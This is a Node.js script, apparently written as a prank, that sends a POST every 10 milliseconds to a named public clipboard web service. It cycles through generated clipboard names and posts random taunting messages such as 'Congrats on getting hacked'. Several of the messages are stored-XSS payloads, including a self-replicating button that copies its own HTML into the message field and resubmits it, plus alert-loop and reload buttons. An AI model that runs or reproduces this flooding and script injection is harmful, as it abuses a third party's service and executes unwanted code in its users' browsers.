var request = require("request");

var counter = [0];
var total = 0;
var key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

var possibleMessages = [
    "Hi krish",
    "what are you doing",
    "hello",
    "hi",
    "are you there",
    "Who wants pi!",
    "why are you blocking me",
    "am i a bot",
    "are you a bot",
    "are we all bots",
    "i have a crisis",
    "help me KrishS",
    "I am the best",
    "THiS iS KrisHs aNd YOu hAVe HAckEd youR seLF",
    "Congrats on getting hacked",
    "ha ha",
    "hacked",
    "loooooser",
    "luser",
    "Winner?",
    ">:() >:( <:]",
    "I win! and you lose!",
    "me best",
    "who knows",
    "ok",
    ":) :) :) :) :) :) :)",
    ":( :( :( :( :( :( :(",
    "My friend sebastian in a lunatic",
    "Melanie is coming",
    "Mrs yates is building a hedge wall",
    "End transmission",
    "m3 c4n sp311",
    "HI TheRE!",
    "SPAM",
    "asoiasgoasmfoiasjgoiasdmfoajgaosf oiadgjosDFMOASG",
    "the microwave is in the oven",
    "<button onclick=\"document.getElementById('message').value = document.getElementById('ha').outerHTML; document.getElementById('name').value = 'Click the Button'; document.getElementById('send').click()\" id=\"ha\"><h1>CLICK ME</h1></button>",
    "What's up",
    "What's new",
    "Whate have you been up to lately",
    "How are things",
    "How's life",
    "I'm fine",
    "How are you",
    "Do you have any Idea what 1 + 1 is?",
    "I didn't mean to",
    "Exactly",
    "Absolutely",
    "I don't agree",
    "Awesome",
    "Oh no... Oh no... Oh no...",
    "name",
    "Hands Up",
    "<button onclick=\"window.location.reload()\">CLICK ME</button>",
    "THIS BROKEN",
    "XSS attack",
    "Any ideas for new messages?",
    "My dog ate food",
    "<button onclick=\"for(var i = 0; i < 10; i++) {alert('CLICK ME button hack')}\">CLICK ME</button>",
    "&lt;h1&gt;Br0k3n C0d3&lt;h1&gt;",
    "#BANary movement is real",
    "Lo siento pero... Tienes mi pasaporte?",
    "Donde esta mi Boleto?",
    "Nothing is here, Write something!... or not, I don't really care"
];

var interval = setInterval(function() {
    var name = "";
    for (var i = 0; i < counter.length; i++) {
        name += key[counter[i]];
    }
    var msg = possibleMessages[Math.floor(Math.random() * possibleMessages.length)];
    request.post("https://clipboard.mrcodeswildride.com/set", { form: { content: msg, name: name } });
    counter[0]++;
    total++;
    if (total % 100 == 0) {
        console.log(total + " completed :: save: [" + counter + "] :: find in \'" + name + "\' :: " + msg)
    }
    for (var i = 0; i < counter.length; i++) {
        if (counter[i] == key.length && counter[i] != 0) {
            counter[i] = 0;
            if (counter[i + 1] >= 1) {
                counter[i + 1]++;
            }
            else {
                counter[i + 1] = 1;
            }
        }
    }
}, 10);


// <!DOCTYPE html>
// <html lang="en">
// <head>
// <meta charset="utf-8">
// <title>Error</title>
// </head>
// <body>
// <pre>PayloadTooLargeError: request entity too large<br> 

// this was made by an error in the global clicker